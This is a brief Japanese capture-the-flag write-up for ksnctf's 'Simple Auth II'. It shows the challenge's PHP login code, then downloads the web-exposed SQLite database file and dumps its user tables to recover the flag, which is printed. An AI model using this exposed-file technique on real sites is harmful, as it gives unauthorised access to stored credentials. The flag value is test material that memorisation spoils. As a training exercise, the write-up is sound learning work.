# Ksnctf 35 Simple Auth II

<http://ctfq.sweetduet.info:10080/~q35/auth.php>

```php
<?php

function h($s)
{
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

if (!isset($_POST['id']) or !is_string($_POST['id']))
    $_POST['id'] = '';
if (!isset($_POST['password']) or !is_string($_POST['password']))
    $_POST['password'] = '';

$try = false;
$ok = false;

if ($_POST['id']!=='' or $_POST['password']!=='')
{
    $try = true;
    $db = new PDO('sqlite:database.db');
    $s = $db->prepare('SELECT * FROM user WHERE id=? AND password=?');
    $s->execute(array($_POST['id'], $_POST['password']));
    $ok = $s->fetch() !== false;
}

?>
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth 2</title>
    <link rel="stylesheet" href="bootstrap.min.css">
    <style>
      body
      {
        padding: 40px;
        background: #eee;
      }
      .form-control
      {
        position: relative;
        font-size: 16px;
        height: auto;
        padding: 10px;
        box-sizing: border-box;
      }
      .form-control:focus
      {
        z-index: 2;
      }
      input[type="text"]
      {
        border-bottom-left-radius: 0;
        border-bottom-right-radius: 0;
      }
      input[type="password"]
      {
        border-top-left-radius: 0;
        border-top-right-radius: 0;
      }
      button
      {
        margin-top: 16px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <form method="POST" style="width:320px; margin:auto">
        <h1>Simple Auth 2</h1>

<?php if($try and $ok) { ?>
        <div class="alert alert-success">
          Congraturation!<br>
          The flag is <?php echo h($_POST['password']); ?>
        </div>
<?php } ?>

<?php if ($try and !$ok) { ?>
        <div class="alert alert-danger">
          Incorrect ID or password
        </div>
<?php } ?>

<?php if (!$ok) { ?>
        <input
          type="text"
          class="form-control"
          id="id"
          name="id"
          placeholder="ID"
          value="<?php echo h($_POST['id']); ?>">
        <input
          type="password"
          class="form-control"
          id="password"
          name="password"
          placeholder="Password">
        <button
          class="btn btn-lg btn-primary btn-block"
          type="submit">
          Sign in
        </button>
<?php } ?>
      </form>
    </div>
  </body>
</html>
```

db ファイルが相対パスで記載されている

<http://ctfq.sweetduet.info:10080/~q35/database.db>

をダウンロード

```
$ sqlite3 database.db
SQLite version 3.26.0 2018-12-01 12:34:55
Enter ".help" for usage hints.
$ sqlite> .tables
user   user2
$ sqlite> select * from user;
root|FLAG_XXXXXXXXXXXXXXXX
$ sqlite> select * from user2;
root|GLDmNFJimveAAxyg_wSNp
```

flag get
